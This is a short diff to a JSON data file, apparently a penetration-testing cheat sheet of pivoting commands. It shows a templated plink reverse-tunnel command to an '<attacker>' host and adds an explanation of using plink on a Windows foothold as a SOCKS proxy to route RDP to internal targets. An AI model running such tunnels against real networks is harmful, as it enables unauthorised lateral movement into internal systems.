@@ -100,5 +100,6 @@
       "label": "Reverse via plink -R",
       "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>"
     }
-  ]
+  ],
+  "explain": "PuTTY's command-line SSH client for a Windows foothold, opening a SOCKS proxy:\n  -ssh              use the SSH protocol\n  -D <socks_port>   dynamic forward - a local SOCKS proxy over the SSH tunnel\n  <user>@<pivot>    SSH credentials for the pivot\nGives you a SOCKS proxy on Windows; point Proxifier at it to force apps like mstsc.exe through to internal targets."
 }
